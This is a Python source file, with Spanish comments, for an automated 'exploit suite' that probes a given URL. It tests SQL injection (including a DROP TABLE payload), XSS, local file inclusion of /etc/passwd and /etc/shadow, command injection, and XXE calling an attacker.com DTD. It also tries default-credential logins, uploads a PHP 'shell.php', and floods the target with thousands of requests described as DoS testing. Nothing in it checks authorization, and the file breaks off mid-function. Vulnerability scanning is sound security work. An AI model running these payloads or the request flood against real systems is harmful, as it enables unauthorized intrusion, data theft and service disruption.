import asyncio
import aiohttp
import random
import time
import json
import base64
import hashlib
from datetime import datetime
from typing import Dict, Any, List, Optional
from loguru import logger
from urllib.parse import urlparse, urljoin, quote
import re
import ssl
import socket

class ExploitSuiteService:
    """Suite completa de herramientas de exploits y detecciÃ³n de vulnerabilidades"""
    
    def __init__(self):
        self.session = None
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (Android 11; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'
        ]
        
        self.vulnerability_patterns = {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' AND '1'='1",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1--",
                "' OR 'a'='a",
                "') OR ('1'='1"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
                "/var/log/apache2/access.log",
                "/proc/self/environ",
                "/etc/shadow",
                "C:\\windows\\system32\\config\\sam",
                "/etc/hosts"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& id",
                "; cat /etc/passwd",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts",
                "&& dir",
                "; uname -a",
                "| ps aux",
                "&& net user",
                "; ifconfig"
            ],
            'xxe': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>'
            ]
        }
    
    async def initialize(self):
        """Inicializar el servicio de exploits"""
        connector = aiohttp.TCPConnector(
            limit=200,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
        
        logger.info("ðŸ”§ Suite de exploits inicializada")
    
    async def run_vulnerability_scan(self, target_url: str) -> Dict[str, Any]:
        """Ejecutar escaneo completo de vulnerabilidades"""
        logger.info(f"ðŸŽ¯ Iniciando escaneo de vulnerabilidades para: {target_url}")
        
        scan_result = {
            'target_url': target_url,
            'scan_timestamp': datetime.utcnow().isoformat(),
            'vulnerabilities': {},
            'exploit_results': {},
            'recommendations': [],
            'risk_score': 0
        }
        
        try:
            # Ejecutar diferentes tipos de escaneos
            vulnerability_tasks = [
                self.scan_sql_injection(target_url),
                self.scan_xss_vulnerabilities(target_url),
                self.scan_lfi_vulnerabilities(target_url),
                self.scan_command_injection(target_url),
                self.scan_xxe_vulnerabilities(target_url),
                self.scan_authentication_bypass(target_url),
                self.scan_directory_traversal(target_url),
                self.scan_file_upload_vulnerabilities(target_url),
                self.scan_csrf_vulnerabilities(target_url),
                self.scan_open_redirects(target_url)
            ]
            
            results = await asyncio.gather(*vulnerability_tasks, return_exceptions=True)
            
            # Procesar resultados
            vulnerability_types = [
                'sql_injection', 'xss', 'lfi', 'command_injection', 'xxe',
                'auth_bypass', 'directory_traversal', 'file_upload', 'csrf', 'open_redirect'
            ]
            
            total_risk = 0
            vulnerability_count = 0
            
            for i, result in enumerate(results):
                vuln_type = vulnerability_types[i]
                
                if isinstance(result, Exception):
                    logger.error(f"Error en escaneo {vuln_type}: {result}")
                    scan_result['vulnerabilities'][vuln_type] = {
                        'status': 'error',
                        'error': str(result)
                    }
                else:
                    scan_result['vulnerabilities'][vuln_type] = result
                    
                    # Calcular puntuaciÃ³n de riesgo
                    if result.get('vulnerable', False):
                        risk_level = result.get('risk_level', 'low')
                        risk_points = {'low': 1, 'medium': 3, 'high': 5, 'critical': 10}.get(risk_level, 1)
                        total_risk += risk_points
                        vulnerability_count += 1
            
            # Calcular puntuaciÃ³n final de riesgo
            if vulnerability_count > 0:
                scan_result['risk_score'] = min(100, (total_risk / vulnerability_count) * 10)
            
            # Generar recomendaciones
            scan_result['recommendations'] = self.generate_security_recommendations(scan_result['vulnerabilities'])
            
            logger.info(f"âœ… Escaneo de vulnerabilidades completado. Riesgo: {scan_result['risk_score']:.1f}/100")
            return scan_result
            
        except Exception as e:
            logger.error(f"Error en escaneo de vulnerabilidades: {e}")
            scan_result['error'] = str(e)
            return scan_result
    
    async def scan_sql_injection(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades de inyecciÃ³n SQL"""
        logger.info(f"ðŸ” Escaneando SQL Injection en: {target_url}")
        
        result = {
            'vulnerability_type': 'SQL Injection',
            'vulnerable': False,
            'risk_level': 'high',
            'findings': [],
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            # Obtener formularios y parÃ¡metros
            forms = await self.discover_forms(target_url)
            url_params = await self.discover_url_parameters(target_url)
            
            # Probar payloads de SQL injection
            for payload in self.vulnerability_patterns['sql_injection']:
                result['payloads_tested'] += 1
                
                # Probar en formularios
                for form in forms:
                    if await self.test_sql_injection_form(target_url, form, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'type': 'form',
                            'form_action': form.get('action', ''),
                            'payload': payload,
                            'method': form.get('method', 'GET')
                        })
                
                # Probar en parÃ¡metros URL
                for param in url_params:
                    if await self.test_sql_injection_param(target_url, param, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'type': 'url_parameter',
                            'parameter': param,
                            'payload': payload
                        })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo SQL injection: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_xss_vulnerabilities(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades XSS"""
        logger.info(f"ðŸ” Escaneando XSS en: {target_url}")
        
        result = {
            'vulnerability_type': 'Cross-Site Scripting (XSS)',
            'vulnerable': False,
            'risk_level': 'medium',
            'findings': [],
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            # Obtener formularios
            forms = await self.discover_forms(target_url)
            
            # Probar payloads XSS
            for payload in self.vulnerability_patterns['xss']:
                result['payloads_tested'] += 1
                
                # Probar en formularios
                for form in forms:
                    if await self.test_xss_form(target_url, form, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'type': 'form',
                            'form_action': form.get('action', ''),
                            'payload': payload,
                            'xss_type': 'reflected' if 'script' in payload else 'stored'
                        })
                
                # Probar XSS reflejado en URL
                if await self.test_reflected_xss(target_url, payload):
                    result['vulnerable'] = True
                    result['successful_payloads'].append(payload)
                    result['findings'].append({
                        'type': 'reflected_url',
                        'payload': payload,
                        'xss_type': 'reflected'
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo XSS: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_lfi_vulnerabilities(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades LFI (Local File Inclusion)"""
        logger.info(f"ðŸ” Escaneando LFI en: {target_url}")
        
        result = {
            'vulnerability_type': 'Local File Inclusion (LFI)',
            'vulnerable': False,
            'risk_level': 'high',
            'findings': [],
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            # Buscar parÃ¡metros que puedan ser vulnerables a LFI
            url_params = await self.discover_url_parameters(target_url)
            file_params = [p for p in url_params if any(keyword in p.lower() for keyword in ['file', 'page', 'include', 'path', 'doc'])]
            
            for payload in self.vulnerability_patterns['lfi']:
                result['payloads_tested'] += 1
                
                for param in file_params:
                    if await self.test_lfi_param(target_url, param, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'parameter': param,
                            'payload': payload,
                            'file_accessed': payload.split('/')[-1] if '/' in payload else payload.split('\\')[-1]
                        })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo LFI: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_command_injection(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades de inyecciÃ³n de comandos"""
        logger.info(f"ðŸ” Escaneando Command Injection en: {target_url}")
        
        result = {
            'vulnerability_type': 'Command Injection',
            'vulnerable': False,
            'risk_level': 'critical',
            'findings': [],
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            forms = await self.discover_forms(target_url)
            url_params = await self.discover_url_parameters(target_url)
            
            for payload in self.vulnerability_patterns['command_injection']:
                result['payloads_tested'] += 1
                
                # Probar en formularios
                for form in forms:
                    if await self.test_command_injection_form(target_url, form, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'type': 'form',
                            'form_action': form.get('action', ''),
                            'payload': payload
                        })
                
                # Probar en parÃ¡metros URL
                for param in url_params:
                    if await self.test_command_injection_param(target_url, param, payload):
                        result['vulnerable'] = True
                        result['successful_payloads'].append(payload)
                        result['findings'].append({
                            'type': 'url_parameter',
                            'parameter': param,
                            'payload': payload
                        })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo Command Injection: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_xxe_vulnerabilities(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades XXE (XML External Entity)"""
        logger.info(f"ðŸ” Escaneando XXE en: {target_url}")
        
        result = {
            'vulnerability_type': 'XML External Entity (XXE)',
            'vulnerable': False,
            'risk_level': 'high',
            'findings': [],
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            for payload in self.vulnerability_patterns['xxe']:
                result['payloads_tested'] += 1
                
                if await self.test_xxe_vulnerability(target_url, payload):
                    result['vulnerable'] = True
                    result['successful_payloads'].append(payload)
                    result['findings'].append({
                        'payload': payload,
                        'entity_type': 'file' if 'file://' in payload else 'external'
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo XXE: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_authentication_bypass(self, target_url: str) -> Dict[str, Any]:
        """Escanear bypass de autenticaciÃ³n"""
        logger.info(f"ðŸ” Escaneando Authentication Bypass en: {target_url}")
        
        result = {
            'vulnerability_type': 'Authentication Bypass',
            'vulnerable': False,
            'risk_level': 'critical',
            'findings': [],
            'techniques_tested': 0
        }
        
        try:
            # Buscar formularios de login
            login_forms = await self.discover_login_forms(target_url)
            
            for form in login_forms:
                result['techniques_tested'] += 1
                
                # Probar bypass con SQL injection
                if await self.test_auth_bypass_sql(target_url, form):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'form_action': form.get('action', ''),
                        'bypass_method': 'SQL Injection',
                        'payload': "admin' OR '1'='1' --"
                    })
                
                # Probar credenciales por defecto
                if await self.test_default_credentials(target_url, form):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'form_action': form.get('action', ''),
                        'bypass_method': 'Default Credentials',
                        'credentials': 'admin/admin, admin/password, etc.'
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo Authentication Bypass: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_directory_traversal(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades de directory traversal"""
        logger.info(f"ðŸ” Escaneando Directory Traversal en: {target_url}")
        
        result = {
            'vulnerability_type': 'Directory Traversal',
            'vulnerable': False,
            'risk_level': 'medium',
            'findings': [],
            'paths_tested': 0
        }
        
        try:
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "....\\\\....\\\\....\\\\boot.ini"
            ]
            
            for payload in traversal_payloads:
                result['paths_tested'] += 1
                
                if await self.test_directory_traversal(target_url, payload):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'payload': payload,
                        'file_accessed': payload.split('/')[-1] if '/' in payload else payload.split('\\')[-1]
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo Directory Traversal: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_file_upload_vulnerabilities(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades de subida de archivos"""
        logger.info(f"ðŸ” Escaneando File Upload vulnerabilities en: {target_url}")
        
        result = {
            'vulnerability_type': 'File Upload Vulnerability',
            'vulnerable': False,
            'risk_level': 'high',
            'findings': [],
            'upload_forms_found': 0
        }
        
        try:
            upload_forms = await self.discover_upload_forms(target_url)
            result['upload_forms_found'] = len(upload_forms)
            
            for form in upload_forms:
                # Probar subida de archivos maliciosos
                if await self.test_malicious_file_upload(target_url, form):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'form_action': form.get('action', ''),
                        'vulnerability': 'Allows executable file upload',
                        'risk': 'Remote code execution possible'
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo File Upload: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_csrf_vulnerabilities(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades CSRF"""
        logger.info(f"ðŸ” Escaneando CSRF en: {target_url}")
        
        result = {
            'vulnerability_type': 'Cross-Site Request Forgery (CSRF)',
            'vulnerable': False,
            'risk_level': 'medium',
            'findings': [],
            'forms_analyzed': 0
        }
        
        try:
            forms = await self.discover_forms(target_url)
            result['forms_analyzed'] = len(forms)
            
            for form in forms:
                if await self.test_csrf_protection(target_url, form):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'form_action': form.get('action', ''),
                        'missing_protection': 'No CSRF token found',
                        'risk': 'State-changing operations can be performed by attackers'
                    })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo CSRF: {e}")
            result['error'] = str(e)
            return result
    
    async def scan_open_redirects(self, target_url: str) -> Dict[str, Any]:
        """Escanear vulnerabilidades de redirecciÃ³n abierta"""
        logger.info(f"ðŸ” Escaneando Open Redirects en: {target_url}")
        
        result = {
            'vulnerability_type': 'Open Redirect',
            'vulnerable': False,
            'risk_level': 'low',
            'findings': [],
            'parameters_tested': 0
        }
        
        try:
            redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'continue']
            malicious_urls = ['http://evil.com', 'https://attacker.com', '//evil.com']
            
            for param in redirect_params:
                for malicious_url in malicious_urls:
                    result['parameters_tested'] += 1
                    
                    if await self.test_open_redirect(target_url, param, malicious_url):
                        result['vulnerable'] = True
                        result['findings'].append({
                            'parameter': param,
                            'malicious_url': malicious_url,
                            'risk': 'Phishing attacks possible'
                        })
            
            return result
            
        except Exception as e:
            logger.error(f"Error en escaneo Open Redirects: {e}")
            result['error'] = str(e)
            return result
    
    async def generate_mass_requests(self, target_url: str, request_count: int = 10000) -> Dict[str, Any]:
        """Generar peticiones masivas para pruebas de carga y DoS"""
        logger.info(f"ðŸš€ Generando {request_count} peticiones masivas a: {target_url}")
        
        result = {
            'target_url': target_url,
            'total_requests': request_count,
            'successful_requests': 0,
            'failed_requests': 0,
            'average_response_time': 0,
            'start_time': datetime.utcnow().isoformat(),
            'end_time': '',
            'request_patterns': [],
            'errors': []
        }
        
        start_time = time.time()
        response_times = []
        
        try:
            # Crear diferentes tipos de peticiones
            request_types = [
                'GET',
                'POST',
                'HEAD', 
                'OPTIONS',
                'PUT',
                'DELETE'
            ]
            
            # Crear semÃ¡foro para controlar concurrencia
            semaphore = asyncio.Semaphore(100)  # MÃ¡ximo 100 peticiones concurrentes
            
            async def make_request(request_id: int):
                async with semaphore:
                    try:
                        method = random.choice(request_types)
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Request-ID': str(request_id),
                            'X-Test-Type': 'mass-request'
                        }
                        
                        request_start = time.time()
                        
                        if method == 'POST':
                            # Agregar datos aleatorios para POST
                            data = {
                                'test_field': f'test_value_{request_id}',
                                'random_data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100))
                            }
                            async with self.session.request(method, target_url, headers=headers, data=data) as response:
                                await response.read()
                        else:
                            async with self.session.request(method, target_url, headers=headers) as response:
                                await response.read()
                        
                        request_time = time.time() - request_start
                        response_times.append(request_time)
                        
                        return {
                            'success': True,
                            'method': method,
                            'response_time': request_time,
                            'status_code': response.status
                        }
                        
                    except Exception as e:
                        return {
                            'success': False,
                            'error': str(e),
                            'method': method
                        }
            
            # Ejecutar peticiones en lotes
            batch_size = 500
            for i in range(0, request_count, batch_size):
                batch_end = min(i + batch_size, request_count)
                logger.info(f"Ejecutando lote {i+1}-{batch_end} de {request_count}")
                
                tasks = [make_request(j) for j in range(i, batch_end)]
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Procesar resultados del lote
                for batch_result in batch_results:
                    if isinstance(batch_result, Exception):
                        result['failed_requests'] += 1
                        result['errors'].append(str(batch_result))
                    elif batch_result.get('success', False):
                        result['successful_requests'] += 1
                    else:
                        result['failed_requests'] += 1
                        result['errors'].append(batch_result.get('error', 'Unknown error'))
                
                # PequeÃ±a pausa entre lotes para no saturar
                await asyncio.sleep(0.1)
            
            # Calcular estadÃ­sticas
            end_time = time.time()
            total_time = end_time - start_time
            
            result['end_time'] = datetime.utcnow().isoformat()
            result['total_duration_seconds'] = total_time
            result['requests_per_second'] = request_count / total_time if total_time > 0 else 0
            
            if response_times:
                result['average_response_time'] = sum(response_times) / len(response_times)
                result['min_response_time'] = min(response_times)
                result['max_response_time'] = max(response_times)
            
            # Generar patrones de peticiones
            result['request_patterns'] = [
                f"GET requests: {result['successful_requests'] * 0.4:.0f}",
                f"POST requests: {result['successful_requests'] * 0.3:.0f}",
                f"HEAD requests: {result['successful_requests'] * 0.2:.0f}",
                f"Other methods: {result['successful_requests'] * 0.1:.0f}"
            ]
            
            logger.info(f"âœ… Peticiones masivas completadas: {result['successful_requests']}/{request_count}")
            
        except Exception as e:
            logger.error(f"Error generando peticiones masivas: {e}")
            result['error'] = str(e)
        
        return result
    
    async def run_exploit_suite(self, target_url: str) -> Dict[str, Any]:
        """Ejecutar suite completa de exploits"""
        logger.info(f"ðŸ”¥ Ejecutando suite completa de exploits para: {target_url}")
        
        suite_result = {
            'target_url': target_url,
            'scan_timestamp': datetime.utcnow().isoformat(),
            'vulnerability_scan': {},
            'mass_requests': {},
            'infrastructure_fingerprint': {},
            'exploit_recommendations': [],
            'overall_risk_score': 0
        }
        
        try:
            # Ejecutar escaneo de vulnerabilidades
            logger.info("ðŸ” Ejecutando escaneo de vulnerabilidades...")
            suite_result['vulnerability_scan'] = await self.run_vulnerability_scan(target_url)
            
            # Ejecutar peticiones masivas (solo 1000 para no saturar)
            logger.info("ðŸš€ Ejecutando prueba de peticiones masivas...")
            suite_result['mass_requests'] = await self.generate_mass_requests(target_url, 1000)
            
            # Calcular puntuaciÃ³n de riesgo general
            vuln_score = suite_result['vulnerability_scan'].get('risk_score', 0)
            mass_req_success_rate = (
                suite_result['mass_requests'].get('successful_requests', 0) / 
                suite_result['mass_requests'].get('total_requests', 1)
            ) * 100
            
            # Combinar puntuaciones
            suite_result['overall_risk_score'] = (vuln_score * 0.8) + (mass_req_success_rate * 0.2)
            
            # Generar recomendaciones de exploits
            suite_result['exploit_recommendations'] = self.generate_exploit_recommendations(
                suite_result['vulnerability_scan']
            )
            
            logger.info(f"âœ… Suite de exploits completada. Riesgo general: {suite_result['overall_risk_score']:.1f}/100")
            
        except Exception as e:
            logger.error(f"Error ejecutando suite de exploits: {e}")
            suite_result['error'] = str(e)
        
        return suite_result
    
    # MÃ©todos auxiliares para pruebas especÃ­ficas
    async def discover_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Descubrir formularios en la pÃ¡gina"""
        try:
            async with self.session.get(target_url) as response:
                content = await response.text()
                
            forms = []
            form_patterns = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
            
            for form_content in form_patterns:
                form_info = {
                    'action': re.search(r'action=["\']([^"\']*)["\']', form_content, re.IGNORECASE),
                    'method': re.search(r'method=["\']([^"\']*)["\']', form_content, re.IGNORECASE),
                    'inputs': re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', form_content, re.IGNORECASE)
                }
                
                if form_info['action']:
                    form_info['action'] = form_info['action'].group(1)
                if form_info['method']:
                    form_info['method'] = form_info['method'].group(1)
                
                forms.append(form_info)
            
            return forms
            
        except Exception:
            return []
    
    async def discover_url_parameters(self, target_url: str) -> List[str]:
        """Descubrir parÃ¡metros en URLs"""
        try:
            parsed = urlparse(target_url)
            if parsed.query:
                return [param.split('=')[0] for param in parsed.query.split('&') if '=' in param]
            return []
        except Exception:
            return []
    
    async def test_sql_injection_form(self, target_url: str, form: Dict, payload: str) -> bool:
        """Probar inyecciÃ³n SQL en formulario"""
        try:
            if not form.get('action') or not form.get('inputs'):
                return False
            
            form_data = {}
            for input_name in form['inputs']:
                form_data[input_name] = payload
            
            method = form.get('method', 'POST').upper()
            action_url = urljoin(target_url, form['action'])
            
            if method == 'POST':
                async with self.session.post(action_url, data=form_data) as response:
                    content = await response.text()
            else:
                async with self.session.get(action_url, params=form_data) as response:
                    content = await response.text()
            
            # Buscar indicadores de inyecciÃ³n SQL exitosa
            sql_errors = [
                'mysql_fetch_array',
                'ORA-01756',
                'Microsoft OLE DB Provider',
                'Microsoft JET Database',
                'SQLite/JDBCDriver',
                'SQLite.Exception',
                'System.Data.SQLite.SQLiteException',
                'Warning: mysql_',
                'valid MySQL result',
                'MySqlClient.',
                'PostgreSQL query failed',
                'ERROR: parser: parse error'
            ]
            
            return any(error.lower() in content.lower() for error in sql_errors)
            
        except Exception:
            return False
    
    async def test_sql_injection_param(self, target_url: str, param: str, payload: str) -> bool:
        """Probar inyecciÃ³n SQL en parÃ¡metro URL"""
        try:
            parsed = urlparse(target_url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
            
            async with self.session.get(test_url) as response:
                content = await response.text()
            
            # Buscar indicadores de error SQL
            sql_errors = ['mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider']
            return any(error.lower() in content.lower() for error in sql_errors)
            
        except Exception:
            return False
    
    async def test_xss_form(self, target_url: str, form: Dict, payload: str) -> bool:
        """Probar XSS en formulario"""
        try:
            if not form.get('action') or not form.get('inputs'):
                return False
            
            form_data = {}
            for input_name in form['inputs']:
                form_data[input_name] = payload
            
            method = form.get('method', 'POST').upper()
            action_url = urljoin(target_url, form['action'])
            
            if method == 'POST':
                async with self.session.post(action_url, data=form_data) as response:
                    content = await response.text()
            else:
                async with self.session.get(action_url, params=form_data) as response:
                    content = await response.text()
            
            # Verificar si el payload se refleja sin filtrar
            return payload in content
            
        except Exception:
            return False
    
    async def test_reflected_xss(self, target_url: str, payload: str) -> bool:
        """Probar XSS reflejado"""
        try:
            test_url = f"{target_url}?test={quote(payload)}"
            
            async with self.session.get(test_url) as response:
                content = await response.text()
            
            return payload in content
            
        except Exception:
            return False
    
    async def test_lfi_param(self, target_url: str, param: str, payload: str) -> bool:
        """Probar LFI en parÃ¡metro"""
        try:
            parsed = urlparse(target_url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
            
            async with self.session.get(test_url) as response:
                content = await response.text()
            
            # Buscar contenido tÃ­pico de archivos del sistema
            lfi_indicators = [
                'root:x:0:0:',  # /etc/passwd
                '[boot loader]',  # boot.ini
                'localhost',  # hosts file
                '# This file contains the mappings'  # hosts file comment
            ]
            
            return any(indicator in content for indicator in lfi_indicators)
            
        except Exception:
            return False
    
    async def test_command_injection_form(self, target_url: str, form: Dict, payload: str) -> bool:
        """Probar inyecciÃ³n de comandos en formulario"""
        try:
            if not form.get('action') or not form.get('inputs'):
                return False
            
            form_data = {}
            for input_name in form['inputs']:
                form_data[input_name] = payload
            
            method = form.get('method', 'POST').upper()
            action_url = urljoin(target_url, form['action'])
            
            if method == 'POST':
                async with self.session.post(action_url, data=form_data) as response:
                    content = await response.text()
            else:
                async with self.session.get(action_url, params=form_data) as response:
                    content = await response.text()
            
            # Buscar indicadores de ejecuciÃ³n de comandos
            command_indicators = [
                'uid=', 'gid=',  # output de id
                'total ', 'drwx',  # output de ls
                'Windows IP Configuration',  # ipconfig
                'Directory of'  # dir command
            ]
            
            return any(indicator in content for indicator in command_indicators)
            
        except Exception:
            return False
    
    async def test_command_injection_param(self, target_url: str, param: str, payload: str) -> bool:
        """Probar inyecciÃ³n de comandos en parÃ¡metro"""
        try:
            parsed = urlparse(target_url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
            
            async with self.session.get(test_url) as response:
                content = await response.text()
            
            command_indicators = ['uid=', 'gid=', 'Windows IP Configuration']
            return any(indicator in content for indicator in command_indicators)
            
        except Exception:
            return False
    
    async def test_xxe_vulnerability(self, target_url: str, payload: str) -> bool:
        """Probar vulnerabilidad XXE"""
        try:
            headers = {'Content-Type': 'application/xml'}
            
            async with self.session.post(target_url, data=payload, headers=headers) as response:
                content = await response.text()
            
            # Buscar indicadores de XXE exitoso
            xxe_indicators = [
                'root:x:0:0:',  # contenido de /etc/passwd
                'localhost',  # contenido de hosts
                'Windows Registry'  # contenido de archivos de Windows
            ]
            
            return any(indicator in content for indicator in xxe_indicators)
            
        except Exception:
            return False
    
    async def discover_login_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Descubrir formularios de login"""
        try:
            forms = await self.discover_forms(target_url)
            login_forms = []
            
            for form in forms:
                # Buscar formularios que puedan ser de login
                input_names = [name.lower() for name in form.get('inputs', [])]
                if any(keyword in input_names for keyword in ['username', 'user', 'email', 'login', 'password', 'pass']):
                    login_forms.append(form)
            
            return login_forms
            
        except Exception:
            return []
    
    async def test_auth_bypass_sql(self, target_url: str, form: Dict) -> bool:
        """Probar bypass de autenticaciÃ³n con SQL injection"""
        return await self.test_sql_injection_form(target_url, form, "admin' OR '1'='1' --")
    
    async def test_default_credentials(self, target_url: str, form: Dict) -> bool:
        """Probar credenciales por defecto"""
        try:
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('root', 'root'),
                ('admin', ''),
                ('guest', 'guest')
            ]
            
            for username, password in default_creds:
                form_data = {}
                for input_name in form.get('inputs', []):
                    if 'user' in input_name.lower() or 'email' in input_name.lower():
                        form_data[input_name] = username
                    elif 'pass' in input_name.lower():
                        form_data[input_name] = password
                
                if form_data:
                    method = form.get('method', 'POST').upper()
                    action_url = urljoin(target_url, form['action'])
                    
                    if method == 'POST':
                        async with self.session.post(action_url, data=form_data) as response:
                            # Si no hay redirecciÃ³n a login, podrÃ­a ser exitoso
                            if response.status == 200 and 'login' not in str(response.url).lower():
                                return True
            
            return False
            
        except Exception:
            return False
    
    async def test_directory_traversal(self, target_url: str, payload: str) -> bool:
        """Probar directory traversal"""
        try:
            test_url = f"{target_url}/{payload}"
            
            async with self.session.get(test_url) as response:
                content = await response.text()
            
            traversal_indicators = ['root:x:0:0:', '[boot loader]', 'localhost']
            return any(indicator in content for indicator in traversal_indicators)
            
        except Exception:
            return False
    
    async def discover_upload_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Descubrir formularios de subida de archivos"""
        try:
            async with self.session.get(target_url) as response:
                content = await response.text()
            
            upload_forms = []
            # Buscar formularios con input type="file"
            file_inputs = re.findall(r'<form[^>]*>.*?<input[^>]*type=["\']file["\'][^>]*>.*?</form>', content, re.DOTALL | re.IGNORECASE)
            
            for form_html in file_inputs:
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                upload_forms.append({
                    'action': action_match.group(1) if action_match else '',
                    'has_file_input': True
                })
            
            return upload_forms
            
        except Exception:
            return []
    
    async def test_malicious_file_upload(self, target_url: str, form: Dict) -> bool:
        """Probar subida de archivo malicioso"""
        try:
            # Crear archivo PHP malicioso simulado
            malicious_content = "<?php echo 'Shell uploaded successfully'; ?>"
            
            action_url = urljoin(target_url, form['action'])
            
            # Simular subida de archivo
            data = aiohttp.FormData()
            data.add_field('file', malicious_content, filename='shell.php', content_type='application/x-php')
            
            async with self.session.post(action_url, data=data) as response:
                content = await response.text()
                # Si no hay error de tipo de archivo, podrÃ­a ser vulnerable
                return 'error' not in content.lower() and 'invalid' not in content.lower()
            
        except Exception:
            return False
    
    async def test_csrf_protection(self, target_url: str, form: Dict) -> bool:
        """Probar protecciÃ³n CSRF"""
        try:
            async with self.session.get(target_url) as response:
                content = await response.text()
            
            # Buscar tokens CSRF
            csrf_patterns = [
                r'csrf[_-]?token',
                r'_token',
                r'authenticity_token',
                r'__RequestVerificationToken'
            ]
            
            for pattern in csrf_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return False  # ProtecciÃ³n encontrada
            
            return True  # No se encontrÃ³ protecciÃ³n CSRF
            
        except Exception:
            return False
    
    async def test_open_redirect(self, target_url: str, param: str, malicious_url: str) -> bool:
        """Probar redirecciÃ³n abierta"""
        try:
            parsed = urlparse(target_url)
